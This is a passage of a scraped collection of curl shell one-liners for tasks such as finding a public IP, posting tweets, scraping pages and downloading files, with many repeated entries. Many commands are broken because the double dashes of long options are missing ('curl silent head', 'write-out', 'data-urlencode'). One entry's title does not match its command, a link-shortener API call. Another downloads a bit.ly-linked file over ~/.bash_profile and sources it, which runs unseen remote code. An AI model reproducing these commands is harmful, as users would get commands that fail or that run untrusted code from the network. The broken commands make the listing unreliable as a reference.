curl user "USERNAME:PASSWORD" -d status="MESSAGE_GOES_HERE $(curl -s http://tinyurl.com/api-create.php?url=URL_GOES_HERE)" -d source="cURL" http://twitter.com/statuses/update.json -o /dev/null
```

### shorten url using curl, sed and is.gd
```sh
curl -s -d URL="$1" http://is.gd/create.php | sed '/Your new shortened/!d;s/.*value="\([^"]*\)".*/\1/'
```

### random xkcd comic as xml
```sh
curl -sL 'dynamic.xkcd.com/comic/random/' | awk -F\" '/^<img/{printf("<?xml version=\"1.0\"?>\n<xkcd>\n<item>\n <title>%s</title>\n <comment>%s</comment>\n <image>%s</image>\n</item>\n</xkcd>\n", $6, $4, $2)}'
```

### Find out how old a web page is
```sh
curl -Is http://osswin.sourceforge.net/ | grep Mod
```

### Get your public ip
```sh
curl -s http://sputnick-area.net/ip
```

### List NYC startups that are hiring
```sh
curl -s -L http://nytm.org/made-in-nyc | grep "(hiring)" | sed -re 's/<([^>]+)>//g;s/^([ \t]*)//g'
```

### Bitcoin prices from the command line
```sh
curl btc.cm/last
```

### Download all files from podcast RSS feed
```sh
curl http://url/rss | grep -o '<enclosure url="[^"]*' | grep -o '[^"]*$' | xargs wget -c
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Retrieve "last modified" timestamp of web resource in UTC seconds
```sh
curl silent head "${url}" | grep 'Last-Modified:' | cut -c 16- | date -f - +'%s'
```

### The wisdom of Cave Johnson
```sh
curl -s http://www.cavejohnsonhere.com/random/ | grep quote_main | cut -d \> -f 2- | fmt -w $(tput cols)
```

### Download all images from a 4chan thread
```sh
curl -s $1 | grep -o -i '<a href="//images.4chan.org/[^>]*>' | sed -r 's%.*"//([^"]*)".*%\1%' | xargs wget
```

### Get My Public IP Address
```sh
curl -s http://myip.dk/ | egrep -m1 -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'
```

### Send email with curl and gmail
```sh
curl -n ssl-reqd mail-from "<user@gmail.com>" mail-rcpt "<user@server.tld>" url smtps://smtp.gmail.com:465 -T file.txt
```

### Get your current Public IP
```sh
curl ifconfig.me
```

### Get HTTP status code with curl AND print response on new line
```sh
curl -s -o /dev/null -w "%{http_code}\n" localhost
```

### List of countries
```sh
curl -s http://www.infoplease.com/countries.html | grep "<td"  | grep ipa  | sed -e 's#html">#\n#g'  | cut -f 1 -d\<  | grep -v "^\ \ *$"
```

### Automagically create a /etc/hosts file based on your DHCP list (only works on Linksys WRT54G router)
```sh
curl -s -u $username:$password http://192.168.1.1/DHCPTable.htm | grep '<td>.* </td>' | sed 's|\t<td>\(.*\) </td>\r|\1|' | tr '\n' ';' | sed 's/\([^;]*\);\([^;]*\);/\2\t\1\n/g'
```

### List your Boxee queue
```sh
curl -u <username> http://app.boxee.tv/api/get_queue | xml2 | grep /boxeefeed/message/description | awk -F= '{print $2}'
```

### return external ip
```sh
curl inet-ip.info
```

### Get Futurama quotations from slashdot.org servers
```sh
curl -sI http://slashdot.org/ | sed -nr 's/X-(Bender|Fry)(.*)/\1\2/p'
```

### download all jpg in webpage
```sh
curl -sm1 http://www.website.com/ | grep -o 'http://[^"]*jpg' | sort -u | wget -qT1 -i-
```

### Get your current Public IP
```sh
curl ifconfig.me
```

### git clone all user repos
```sh
curl -s https://api.github.com/users/tuxcanfly/repos | jq -r  'map(select(.fork == false)) | map(.url) | map(sub("https://api.github.com/repos/"; "git clone git@github.com:")) | @sh' | xargs -n1 sh -c]
```

### Check remote hosts server
```sh
curl -Is http://www.google.com | grep -E '^Server'
```

### Get Stuff.
```sh
curl "http://www.commandlinefu.com/commands/matching/$(echo "$@" | sed 's/ /-/g')/$(echo -n $@ | base64)/plaintext"
```

### lookup a short url with curl
```sh
curl -I -L http://t.co/mQUxL6yS
```

### Another Curl your IP command
```sh
curl -s http://checkip.dyndns.org | sed 's/[a-zA-Z<>/ :]//g'
```

### Fetch the current human population of Earth
```sh
curl -s http://www.census.gov/popclock/data/population/world | python -c 'import json,sys;obj=json.load(sys.stdin);print obj["world"]["population"]'
```

### Get Futurama quotations from slashdot.org servers
```sh
curl -Is slashdot.org | sed -ne '/^X-[FBL]/s/^X-//p'
```

### Fetches a Reddit user's ($USER) link karma
```sh
curl -s http://www.reddit.com/user/$USER/about.json | tr "," "\n" | grep "link_karma" | tr ": " "\n" | grep -E "[0-9]+" | sed s/"^"/"Link Karma: "/
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Send an http HEAD request w/curl
```sh
curl -I http://localhost
```

### Get My Public IP Address
```sh
curl ifconfig.me
```

### show WAN IP
```sh
curl ifconfig.me
```

### JSON processing with Python
```sh
curl -s "http://feeds.delicious.com/v2/json?count=5" | python -m json.tool | less -R
```

### Update twitter via curl
```sh
curl -u user -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Upload an image to Twitpic
```sh
curl -F "username=mytwiterlogin" -F "password=mytwitterpassword" -F "message=My image description" -F media=@"./image.png" http://twitpic.com/api/uploadAndPost
```

### Gets the english pronunciation of a phrase
```sh
curl -A "Mozilla" "http://translate.google.com/translate_tts?tl=en&q=hello+world" | play -t mp3 -
```

### Download a TiVo Show
```sh
curl -s -c /tmp/cookie -k -u tivo:$MAK digest "$(curl -s -c /tmp/cookie -k -u tivo:$MAK digest https://$tivo/nowplaying/index.html | sed 's;.*<a href="\([^"]*\)">Download MPEG-PS</a>.*;\1;' | sed 's|\&amp;|\&|')" | tivodecode -m $MAK  - > tivo.mpg
```

### Play 2600 off the hook over ssh
```sh
curl -L -s `curl -s http://www.2600.com/oth-broadband.xml` | xmlstarlet sel -t -m "//enclosure[1]" -v "@url" -n | head -n 1` | ssh -t [user]@[host] "mpg123 -"
```

### Play a podcast via XPath and mpg123
```sh
curl -L -s `curl -s [http://podcast.com/show.rss]` | xmlstarlet sel -t -m "//enclosure[1]" -v "@url" -n | head -n 1` | ssh -t [user]@[host] "mpg123 -"
```

### get WAN / external IP
```sh
curl tnx.nl/ip
```

### Get magnet link from URL
```sh
curl -s http://host.net/url.html | grep magnet | sed -r 's/.*(magnet:[^"]*).*/\1/g'
```

### Check your unread Gmail from the command line
```sh
curl -u username:password silent "https://mail.google.com/mail/feed/atom" | tr -d '\n' | awk -F '<entry>' '{for (i=2; i<=NF; i++) {print $i}}' | sed -n "s/<title>\(.*\)<\/title.*name>\(.*\)<\/name>.*/\2 - \1/p"
```

### Check your unread Gmail from the command line
```sh
curl -u username:password silent "https://mail.google.com/mail/feed/atom" | tr -d '\n' | awk -F '<entry>' '{for (i=2; i<=NF; i++) {print $i}}' | sed -n "s/<title>\(.*\)<\/title.*name>\(.*\)<\/name>.*/\2 - \1/p"
```

### Command Line to Get the Stock Quote via Yahoo
```sh
curl -s 'http://download.finance.yahoo.com/d/quotes.csv?s=csco&f=l1'
```

### upload a file via ftp
```sh
curl -u user:passwd -T /home/dir/local_file_to_upload ftp://your_host.com/subdir/
```

### Spelling Suggestion
```sh
curl -s "http://search.yahooapis.com/WebSearchService/V1/spellingSuggestion?appid=YahooDemo&query=mozmbque"|sed -n -e 's/.*<Result>\(.*\)<\/Result>.*/\1/p'
```

### External IP (raw data)
```sh
curl ifconfig.me
```

### Download all files from a Gist without Git
```sh
curl -L https://gist.github.com/westonruter/ea038141e46e017d280b/download | tar -xvz strip-components=1
```

### Find artist and title of a music cd, UPC code given (first result only)
```sh
curl http://www.discogs.com/search?q=724349691704 2> /dev/null | grep \/release\/ | head -2 | tail -1 | sed -e 's/^<div>.*>\(.*\)<\/a><\/div>/\1/'
```

### Get your public ip
```sh
curl -s http://icanhazip.com/
```

### Get the amount of users currently registered at the DudaLibre.com Linux Counter.
```sh
curl silent http://www.dudalibre.com/gnulinuxcounter?lang=en | grep users | head -2 | tail -1 | sed 's/.*<strong>//g' | sed 's/<\/strong>.*//g'
```

### Send a message to Kodi (XBMC)
```sh
curl -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"GUI.ShowNotification","params":{"title":"This is the title of the message","message":"This is the body of the message"},"id":1}' http://i3c.pla.lcl:8080/jsonrpc
```

### Make a HTTP request using curl with POST method
```sh
curl verbose -d "hello=world" http://mydomain.com
```

### get the current weather in NYC, in human readable form
```sh
curl -s poncho.is/forecast/new_york/today/ | grep -E 'og:title|og:description' | cut -d\" -f4 | awk '{print $0,"<p>"}' | lynx -stdin -dump
```

### copy remote ssh session output to local clipboard
```sh
curl "https://coinurl.com/api.php?uuid=5378..........5&url=http://www.commandlinefu.com"
```

### Get number of diggs for a news URL
```sh
curl -s "http://services.digg.com/stories?link=$NEWSURL&appkey=http://www.whatever.com&type=json"  | python -m simplejson.tool | grep diggs
```

### Backup your precious Tomato Router Stats
```sh
curl http://root:PASSWORD@ROUTER_DYN_DNS/bwm/tomato_rstatsa001839ceb1d4.gz?_http_id=HTTPID > $HOME/Dropbox/Backups/tomato_stats.gz
```

### Get URL's from a webpage
```sh
curl url | egrep -o '(http|https)://[a-z0-9]*\.[a-z0-9]*\.[a-z0-9]*'|sort |uniq
```

### Get HTTP headers using curl, but still perform a GET
```sh
curl -sSi <URL> | sed '/^\r$/q'
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### moreplayingaround
```sh
curl -s -u username:passwd http://twitter.com/statuses/friends_timeline.rss|grep title|sed -ne 's/<\/*title>//gp' |festival tts
```

### Download all images from a 4chan thread
```sh
curl -s http://boards.4chan.org/wg/|sed -r 's/.*href="([^"]*).*/\1\n/g'|grep images|xargs wget
```

### Dump filtered twitter stream to a file
```sh
curl -s -u $USERNAME -X POST -d "track=obama,barack" https://stream.twitter.com/1.1/statuses/filter.json -o twitter-stream.out
```

### Get your external IP address
```sh
curl l2.io/ip
```

### Shorten url using bit.ly API
```sh
curl -s data-urlencode 'longUrl='$1 data-urlencode 'login='$login data-urlencode 'apiKey='$apikey 'http://api.bit.ly/shorten?version=2.0.1&format=xml' | xmlstarlet sel -T -t -m "//shortUrl" -v "." | line
```

### Basic monitor for a website or API looking at HTTP response codes
```sh
curl write-out %{http_code} connect-timeout 10 max-time 20 -s -I -L http://google.com output /dev/null
```

### Print the lastest stable version of Perl
```sh
curl -s http://www.perl.org/get.html | grep -m1 '\.tar\.gz' | sed 's/.*perl-//; s/\.tar\.gz.*//'
```

### View the newest xkcd comic.
```sh
curl -s 'xkcd.com' | awk -F\" '/^<img/{printf("<?xml version=\"1.0\"?>\n<xkcd>\n<item>\n <title>%s</title>\n <comment>%s</comment>\n <image>%s</image>\n</item>\n</xkcd>\n", $6, $4, $2)}'
```

### geoip information
```sh
curl -s "http://www.geody.com/geoip.php?ip=$(curl -s icanhazip.com)" | sed '/^IP:/!d;s/<[^>][^>]*>//g'
```

### What is my ip?
```sh
curl http://www.whatismyip.org/
```

### back up your commandlinefu contributed commands
```sh
curl http://www.commandlinefu.com/commands/by/<your username>/rss|gzip ->commandlinefu-contribs-backup-$(date +%Y-%m-%d-%H.%M.%S).rss.gz
```

### What is my ip?
```sh
curl -s mi-ip.net | grep '"ip"' | cut -f2 -d ">" | egrep -o '[0-9.]+'
```

### Retrieve the final URL after redirect
```sh
curl $URL -s -L -o /dev/null -w '%{url_effective}'
```

### get daily wizard of id comic
```sh
curl -o id.gif `date +http://d.yimg.com/a/p/uc/%Y%m%d/largeimagecrwiz%y%m%d.gif`
```

### Get current stable kernel version string from kernel.org
```sh
curl -s kernel.org | grep '<strong>' | head -3 | tail -1 | cut -d'>' -f3 | cut -d'<' -f1
```

### extract XML RSS etc by tags such as <title> or <code> or <description>
```sh
curl ${URL} 2>/dev/null|grep "<${BLOCK}>"|sed -e "s/.*\<${BLOCK}\>\(.*\)\<\/${BLOCK}\>.*/\1/g"
```

### Get the state (HTTP code) of a resource from its URL
```sh
curl -s -L head -w "%{http_code}\n" URL | tail -n1
```

### display the hover text of the most recent xkcd
```sh
curl -s 'http://xkcd.com/rss.xml' | xpath '//item[1]/description/text()' 2>&1 | sed -n 's/.*title="\([^"]*\)".*/\1/p' | fold -s
```

### Output the latest linux kernel versions from kernel.org
```sh
curl 'https://www.kernel.org/kdist/finger_banner'
```

### Check if the LHC has destroyed the world
```sh
curl -q -s http://www.hasthelhcdestroyedtheearth.com/ | sed -En '/span/s/.*>(.*)<.*/\1/p'
```

### Display current temperature anywhere in the world in Farenheit
```sh
curl -s 'http://www.google.com/ig/api?weather=santa+monica,ca'| sed -ne "s/.*temp_f data..//;s/....temp_c data.*//;p" | figlet
```

### Send an http HEAD request w/curl
```sh
curl -i -X HEAD http://localhost/
```

### Clone all github repos of a user
```sh
curl -s "https://api.github.com/users/${USERNAME}/repos" | ruby -rubygems -e 'require "json"; JSON.load(STDIN.read).each {|repo| %x[git clone #{repo["ssh_url"]} ]}'
```

### backup and synchronize entire remote folder locally (curlftpfs and rsync over FTP using FUSE FS)
```sh
curlftpfs ftp://YourUsername:YourPassword@YourFTPServerURL /tmp/remote-website/ && rsync -av /tmp/remote-website/* /usr/local/data_latest && umount /tmp/remote-website
```

### Search commandlinefu from the CLI
```sh
curl -sd q=Network http://www.commandlinefu.com/search/autocomplete |html2text -width 100
```

### Find your Amazon EC2 instance type
```sh
curl -s http://169.254.169.254/latest/meta-data/instance-type
```

### What is my public IP address
```sh
curl -s checkip.dyndns.org|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'
```

### Send youtube video to Kodi
```sh
curl -i -X POST -d '{"jsonrpc": "2.0", "method": "Player.Open", "params": {"item": { "file" : "plugin://plugin.video.youtube/play/?video_id=YOUTUBEID"}}, "id": 1}' http://username:password@kodi/jsonrpc -H "Content-Type: application/json"
```

### Shorten url with is.gd using curl, perl
```sh
curl -s "http://is.gd/api.php?longurl=[long_url]"
```

### Get own public IP address
```sh
curl -s http://wtfismyip.com/text
```

### Get IP address from Tor exit-node
```sh
curl -s -d "CSField=Name" -d "CSInput=BostonUCompSci" http://torstatus.blutmagie.de/index.php | grep -oP "ip=\K(\d+)(\.\d+){3}"
```

### Download all files from a Github gist individually
```sh
curl -sS remote-name-all $(curl -sS https://api.github.com/gists/997ccc3690ccd3ac5196211aff59d989 | jq -r '.files[].raw_url')
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Get your external IP address
```sh
curl -s 'http://checkip.dyndns.org' | sed 's/.*Current IP Address: \([0-9\.]*\).*/\1/g'
```

### commit message generator - whatthecommit.com
```sh
curl -s 'http://whatthecommit.com/' | grep '<p>' | cut -c4-
```

### check details of calling a url
```sh
curl -iv url
```

### commit message generator - whatthecommit.com
```sh
curl -s 'http://whatthecommit.com/' | grep '<p>' | cut -c4-
```

### check details of calling a url
```sh
curl -iv url
```

### sha256 checksum for Chef's remote_file resource
```sh
curl -L -s https://some.file | shasum -a 256 | cut -c-12
```

### Download all images from a 4chan thread
```sh
curl -s http://boards.4chan.org/-/res/nnnnnn | grep -o -i 'File: <a href="//images.4chan.org\/[a-z]*\/src\/[0-9]*\.[a-z]\{3\}' | sed -r 's/File: <a href="\/\///' |xargs wget
```

### Download 40 top funnyjunk Images to the current directory
```sh
curl -s compressed http://funnyjunk.com | awk -F'"' '/ '"'"'mainpagetop24h'"'"'/ { print "http://funnyjunk.com"$4 }' | xargs curl -s | grep -o 'ht.*m/pictures/.*\.jpg\|ht.*m/gifs/.*\.gif' | grep "_......_" | uniq | xargs wget
```

### command line fu roulette
```sh
curl -sL 'www.commandlinefu.com/commands/random' | awk -F'</?[^>]+>' '/"command"/{print $2}'
```

### Fastest way to get public IP
```sh
curl simplesniff.com/ip
```

### Get newest Nmap source code tarball URL.
```sh
curl -Ls https://nmap.org/dist/ | sed -En '/nmap.*tgz/s@^.*href="([^"]+)".*$@https://nmap.org/dist/\1@p' | tail -n1
```

### Get external IP address
```sh
curl -qsL http://checkip.dyn.com | sed -E "s/^.*Address: ([0-9\.]+).*$/\1/"
```

### Submit data to a HTML form with POST method and save the response
```sh
curl -sd 'rid=value&submit=SUBMIT' <URL> > out.html
```

### Save the Top 2500 commands from commandlinefu to a single text file
```sh
curl http://www.commandlinefu.com/commands/browse/sort-by-votes/plaintext/[0-2500:25] | grep -v _curl_ > comfu.txt
```

### BOFH Excuse using curl
```sh
curl -s http://pages.cs.wisc.edu/~ballard/bofh/bofhserver.pl |grep 'is:' |awk 'BEGIN { FS=">"; } { print $10; }'
```

### Delete posts from MyBB Board as User
```sh
curl cookie name=<cookie_value> data-urlencode name=my_post_key=<post_key>\&delete=1\&submit=Delete+Now\&action=deletepost\&pid=$c user-agent Firefox\ 3.5 url http://url/editpost.php?my_post_key=<post_key>\&delete=1\&submit=Delete+Now\&action=dele
```

### This command will shorten any URL the user inputs. What makes this command different is that it utilizes 5 different services and gives you 5 different outputs.
```sh
curl -s http://tinyurl.com/create.php?url=$1 \ | sed -n 's/.*\(http:\/\/tinyurl.com\/[a-z0-9][a-z0-9]*\).*/\1/p' \ | uniq ; curl -s http://bit.ly/?url=$1 \ | sed -n 's/.*\(shortened-url"...............
```

### Get Chromecast opencast pincode
```sh
curl -s "http://$chromecast_ip_address:8008/setup/eureka_info?options=detail" | jq .opencast_pin_code raw-output
```

### Openstack, trigger ceilometer alarm webhook
```sh
curl -X POST -i `ceilometer alarm-show 1383a6be-fb73-4955-9991-8d65a8a23d60  | tr '\n' ' ' | sed -e 's/.*\[\(.*\)\].*/\1/' -e 's/[| ]*//g' -e 's/^u//' -e "s:'::g"`
```

### External IP (raw data)
```sh
curl icanhazip.com
```

### save login cookie
```sh
curl -c cookie.txt -d username=hello -d password=w0r1d http://www.site.com/login
```

### Get your public ip using dyndns
```sh
curl -s 'http://www.loopware.com/ip.php'
```

### send cookie
```sh
curl -b cookie.txt http://www.site.com/download/file.txt
```

### firefox ascii logo
```sh
curl -s http://people.mozilla.com/~faaborg/files/shiretoko/firefoxIcon/firefox-64.png | convert - jpg:- | jp2a color html -> firefox.html
```

### batch download jpgs which are in sequence
```sh
curl -O http://www.site.com/img/image[001-175].jpg
```

### Get a list of HTTP status codes
```sh
curl http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html 2>/dev/null | grep '^<h3' | grep -v '^\d' | perl -pe 's/^.*(?<=(\d\d\d)) (.*)<\/h3>$/$1 : $2/' | grep -v h3
```

### Add git branch name to bash prompt
```sh
curl -L bit.ly/git_bash_profile > ~/.bash_profile && source ~/.bash_profile
```

### External IP (raw data)
```sh
curl ifconfig.me
```

### Get only headers from a website with curl even if it doesn't support HEAD
```sh
curlh() { x="$(curl -Is -w '%{http_code}' "$@")"; if [[ "$(tail -n 1 <<< "$x")" == [45]* ]]; then curl -is "$@" | awk '{ if (!NF) { exit }; print }'; else head -n -1 <<< "$x"; fi; }
```

### Get your outside IP address - now with IPv6 support
```sh
curl ip.tyk.nu
```

### Print trending topics on Twitter
```sh
curl -s mobile.twitter.com/search | sed -n '/trend_footer_list/,/\ul>/p' | awk -F\> '{print $3}' | awk -F\< '{print $1}' | sed '/^$/d'
```

### webpage reader
```sh
curl -s http://www.google.com | espeak -m -ven+11
```

### Amazing real time picture of the sun in your wallpaper
```sh
curl http://sohowww.nascom.nasa.gov/data/realtime/eit_195/512/latest.jpg | xli -onroot -fill stdin
```

### Get your external IP address
```sh
curl http://my-ip.cc/host.json
```

### Watch a TiVo File On Your Computer
```sh
curl -s -c /tmp/cookie -k -u tivo:$MAK digest http://$tivo/download/$filename | tivodecode -m $MAK  - | mplayer - -cache-min 50 -cache 65536
```

### Get current stable kernel version string from kernel.org
```sh
curl -s -k https://www.kernel.org/feeds/kdist.xml | sed -n -e 's@.*<guid>\(.*\)</guid>.*@\1@p' | grep 'stable' | head -1 | awk -F , '{print $3}'
```

### Fetch the current human population of Earth
```sh
curl silent http://www.census.gov/population/international/ | grep wclocknum | sed -r 's@^.*>([0-9,]+)<.*$@\1@'
```

### Get the rough (german) time from Twitter by @zurvollenstunde
```sh
curl -s "http://search.twitter.com/search?from=zurvollenstunde&rpp=1"  | grep -E '(Es ist jetzt|ago)'  | sed 's/<[^>]*>//g;s/[^[:digit:]]//g'  | xargs | sed -e 's#\ #:#'
```

### Command to get list of all existing programming languages from Wikipedia article
```sh
curl http://en.wikipedia.org/wiki/List_of_programming_languages | grep "<li>" | awk -F"title=" '{ print $2 }' | awk -F\" '{ print $2 }'
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Nice weather forecast on your shell
```sh
curl wttr.in/seville
```

### Extract tarball from internet without local saving
```sh
curl http://example.com/a.gz | tar xz
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Get your outgoing IP address
```sh
curl -s ip.appspot.com
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Update twitter from command line without reveal your password
```sh
curl -n -d status='Hello from cli' https://twitter.com/statuses/update.xml
```

### Search commandlinefu.com from the command line using the API
```sh
curl "http://www.commandlinefu.com/commands/matching/$(echo "$@" | sed 's/ /-/g')/$(echo -n $@ | base64)/plaintext"
```

### What is my public IP-address?
```sh
curl ifconfig.me
```

### Print trending topics on Twitter
```sh
curl -s search.twitter.com | awk -F'</?[^>]+>' '/\/intra\/trend\//{print $2}'
```

### generate random identicon
```sh
curl -s "http://www.gravatar.com/avatar/`uuidgen | md5sum | awk '{print $1}'`?s=64&d=identicon&r=PG" | display
```

### What is my ip?
```sh
curl -s checkip.dyndns.org | grep -Eo '[0-9\.]+'
```

### Random line from bash.org  (funny IRC quotes)
```sh
curl -s http://bash.org/?random1|grep -oE "<p class=\"quote\">.*</p>.*</p>"|grep -oE "<p class=\"qt.*?</p>"|sed -e 's/<\/p>/\n/g' -e 's/<p class=\"qt\">//g' -e 's/<p class=\"qt\">//g'|perl -ne 'use HTML::Entities;print decode_entities($_),"\n"'|head -1
```

### What is my ip?
```sh
curl ifconfig.co
```

### What is my ip?
```sh
curl ifconfig.co/all.json
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Extract a remote tarball in the current directory without having to save it locally
```sh
curl http://example.com/foo.tar.gz | tar zxvf -
```

### get you public ip address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### resume download using curl
```sh
curl -C - -o partially_downloaded_file 'www.example.com/path/to/the/file'
```

### Download all Phrack .tar.gzs
```sh
curl http://www.phrack.org/archives/tgz/phrack[1-67].tar.gz -o phrack#1.tar.gz
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Check if your webserver supports gzip compression with curl
```sh
curl -I -H "Accept-Encoding: gzip,deflate" http://example.org
```

### Twit Amarok "now playing" song
```sh
curl -u <user>:<password> -d status="Amarok, now playing: $(dcop amarok default nowPlaying)" http://twitter.com/statuses/update.json
```

### Search Google from the command line
```sh
curl -A Mozilla http://www.google.com/search?q=test |html2text -width 80
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Save xkcd to a pdf with captions
```sh
curl -sL xkcd.com | grep '<img [^>]*/><br/>' | sed -r 's|<img src="(.*)" title="(.*)" alt="(.*)" /><br/>|\1\t\2\t\3|' > /tmp/a; curl -s $(cat /tmp/a | cut -f1) | convert - -gravity south -draw "text 0,0 \"$(cat /tmp/a | cut -f2)\"" pdf:- > xkcd.pdf
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Get HTTP status code with curl
```sh
curl write-out %{http_code} silent output /dev/null localhost
```

### Google URL shortener
```sh
curl -s -d'&url=URL' http://goo.gl/api/url | sed -e 's/{"short_url":"//' -e 's/","added_to_history":false}/\n/'
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Update dyndns.org with your external IP.
```sh
curl -v -k -u user:password "https://members.dyndns.org/nic/update?hostname=<your_domain_name_here>&myip=$(curl -s http://checkip.dyndns.org | sed 's/[a-zA-Z<>/ :]//g')&wildcard=NOCHG&mx=NOCHG&backmx=NOCHG"
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Gets a random Futurama quote from /.
```sh
curl -Is slashdot.org | egrep '^X-(F|B|L)' | cut -d \- -f 2
```

### let the cow suggest some commit messages for you
```sh
curl -s http://whatthecommit.com/index.txt | cowsay
```

### Real time satellite wheather wallpaper
```sh
curl http://www.cpa.unicamp.br/imagens/satelite/ult.gif | xli -onroot -fill stdin
```

### Get your public ip
```sh
curl -s ip.appspot.com
```

### Fetch the current human population of Earth
```sh
curl -s http://www.census.gov/popclock/data/population/world | awk -F'[:,]' '{print $7}'
```

### Get Futurama quotations from slashdot.org servers
```sh
curl -Is slashdot.org | sed -n '5p' | sed 's/^X-//'
```

### A command to post a message to Twitter that includes your geo-location and a short URL.
```sh
curl user "USERNAME:PASSWORD" -d status="MESSAGE_GOES_HERE $(curl -s tinyurl.com/api-create.php?url=URL_GOES_HERE) $(curl -s api.hostip.info/get_html.php?ip=$(curl ip.appspot.com))" -d source="cURL" twitter.com/statuses/update.json -o /dev/null
```

### Retrieve top ip threats from http://isc.sans.org/sources.html and add them into iptables output chain.
```sh
curl -s http://isc.sans.org/sources.html|grep "ipinfo.html"|awk -F"ip=" {'print $2'}|awk -F"\"" {'print $1'}|xargs -n1 sudo iptables -A OUTPUT -j DROP -d > 2&>1
```

### Print trending topics on Twitter
```sh
curl silent search.twitter.com | sed -n '/div id=\"hot\"/,/div/p' | awk -F\> '{print $2}' | awk -F\< '{print $1}' | sed '/^$/d'
```

### Get your external IP address
```sh
curl ip.appspot.com
```

### set desktop background to highest-rated image from Reddit /r/wallpapers
```sh
curl http://www.reddit.com/r/wallpapers.rss | grep -Eo 'http:[^&]+jpg' | head -1 | xargs feh bg-seamless
```

### Geolocate a given IP address
```sh
curl ipinfo.io/<ipaddress>
```

### bulk dl files based on a pattern
```sh
curl -O http://hosted.met-art.com/generated_gallery/full/061606AnnaUkrainePasha/met-art-free-sample-00[00-19].jpg
```

### Download and extract a *tar.gz file with curl.
```sh
curl http://domain.com/file.tar.gz | tar zx
```

### Updating the status on identi.ca using curl.
```sh
curl -u USER:PASS -d status="NEW STATUS" http://identi.ca/api/statuses/update.xml
```

### Updates your no-ip.org account with curl
```sh
curl -u $USERNAME:$PASSWORD "http://dynupdate.no-ip.com/nic/update?hostname=$HOSTNAME"
```

### Get your outgoing IP address
```sh
curl -s icanhazip.com
```

### Get Dollar-Euro exchage rate
```sh
curl -s wap.kitco.com/exrate.wml | awk ' BEGIN { x=0; FS = "<" } { if ($0~"^<br/>") {x=0} if (x==1) {print $1} if ($0~"EUR/US") {x=1} }'
```

### Get your Tweets from the command line
```sh
curl -s -u user:password 'http://twitter.com/statuses/friends_timeline.xml?count=5' | xmlstarlet sel -t -m '//status' -v 'user/screen_name' -o ': ' -v 'text' -n
```

### View online pdf documents in cli
```sh
curl 'LINK' | pdftotext - - | less
```

### get you public ip address
```sh
curl http://ifconfig.me/ip
```

### What is My WAN IP?
```sh
curl -s checkip.dyndns.org | grep -Eo '[0-9\.]+'
```

### validate json
```sh
curl -s -X POST http://www.jsonlint.com/ajax/validate -d json="`cat file.js`" -d reformat=no
```

### Twitpic upload and Tweet
```sh
curl form username=from_twitter form password=from_twitter form media=@/path/to/image form-string "message=tweet" http://twitpic.com/api/uploadAndPost
```

### commit message generator - whatthecommit.com
```sh
curl http://whatthecommit.com/index.txt
```

### Display HTTP-header using curl
```sh
curl -I g.cn
```

### Check your unread Gmail from the command line
```sh
curl -u username silent "https://mail.google.com/mail/feed/atom" | awk 'BEGIN{FS="\n";RS="(</entry>\n)?<entry>"}NR!=1{print "\033[1;31m"$9"\033[0;32m ("$10")\033[0m:\t\033[1;33m"$2"\033[0m"}' | sed -e 's,<[^>]*>,,g' | column -t -s $'\t'
```

### Google URL shortener
```sh
curl -s 'http://ggl-shortener.appspot.com/?url='"$1" | sed -e 's/{"short_url":"//' -e 's/"}/\n/g'
```

### Get your outgoing IP address
```sh
curl -s http://whatismyip.org/ | grep -oP '(\d{1,3}\.){3}\d+'
```

### Download files linked in a RSS feed
```sh
curl $1 | grep -E "http.*\.mp3" | sed "s/.*\(http.*\.mp3\).*/\1/" | xargs wget
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### return external ip
```sh
curl ipinfo.io
```

### display ip address
```sh
curl -s http://myip.dk | grep '<title>' | sed -e 's/<[^>]*>//g'
```

### Dump a web page
```sh
curl -s http://google.com | hexdump -C|less
```

